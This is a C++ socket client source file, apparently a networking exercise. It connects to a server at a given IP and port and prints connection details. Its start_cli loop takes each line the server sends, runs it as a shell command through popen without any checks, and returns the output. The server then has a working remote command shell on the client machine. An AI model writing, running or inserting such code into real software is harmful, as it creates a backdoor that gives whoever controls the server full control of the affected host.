#include "methods.h"

#include <arpa/inet.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <stdlib.h>
#include <iostream>
#include <cstdio>
#include <memory>
#include <stdexcept>
#include <array>

#include "SocketUtils.h"

#define MAXLINE 4096

int init_socket(char *ip, int port)
{
    struct sockaddr_in servaddr;

    int sockfd = SocketUtils::Socket(AF_INET, SOCK_STREAM, 0);

    bzero(&servaddr, sizeof(servaddr));
    servaddr.sin_family = AF_INET;   // use IPv4
    servaddr.sin_port = htons(port); // server port

    SocketUtils::Inet_pton(AF_INET, ip, &servaddr.sin_addr);

    SocketUtils::Connect(sockfd, (struct sockaddr *)&servaddr, sizeof(servaddr));

    return sockfd;
}

void print_local_connection_info(int fd)
{
    struct sockaddr_in addr;
    socklen_t len = sizeof(addr);
    char address_name[128];

    SocketUtils::Getsockname(fd, (struct sockaddr *)&addr, &len);
    SocketUtils::Inet_ntop(AF_INET, &(addr.sin_addr), address_name, sizeof(address_name));

    std::cout << std::endl
              << "*****************************" << std::endl;
    std::cout << "*** Local connection info ***" << std::endl;
    std::cout << "*****************************" << std::endl;
    std::cout << "* Local address = " << address_name << " *" << std::endl;
    std::cout << "* Local port number = " << ntohs(addr.sin_port) << " *" << std::endl;
    std::cout << "*****************************" << std::endl
              << std::endl;
}

void print_server_connection_info(int fd)
{
    struct sockaddr_in addr;
    socklen_t len = sizeof(addr);
    char address_name[128];

    SocketUtils::Getpeername(fd, (struct sockaddr *)&addr, &len);
    SocketUtils::Inet_ntop(AF_INET, &(addr.sin_addr), address_name, sizeof(address_name));

    std::cout << std::endl
              << "******************************" << std::endl;
    std::cout << "*** Server connection info ***" << std::endl;
    std::cout << "******************************" << std::endl;
    std::cout << "* Server address = " << address_name << " *" << std::endl;
    std::cout << "* Server port number = " << ntohs(addr.sin_port) << " *" << std::endl;
    std::cout << "******************************" << std::endl
              << std::endl;
}

std::string exec_command(const char *cmd)
{
    std::array<char, 128> buffer;
    std::string result;
    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd, "r"), pclose);
    if (!pipe)
    {
        throw std::runtime_error("popen() failed!");
    }
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr)
    {
        result += buffer.data();
    }
    return result;
}

void start_cli(int fd)
{
    std::string input;
    char receive_line[MAXLINE];

    while (true)
    {
        if (SocketUtils::Readall(fd, receive_line, MAXLINE) == 0)
        {
            std::cout << "Connection closed!" << std::endl;
            close(fd);
            exit(0);
        }

        std::string result = exec_command(receive_line);

        SocketUtils::Writen(fd, result.c_str(), result.length());

        if (SocketUtils::Readall(fd, receive_line, MAXLINE) == 0)
        {
            std::cout << "Connection closed!" << std::endl;
            close(fd);
            exit(0);
        }

        std::string received_str = std::string(receive_line);
        std::cout << "Received from server (reversed): " << std::string(received_str.rbegin(), received_str.rend()) << std::endl<< std::endl<< std::endl<< std::endl;

    }
}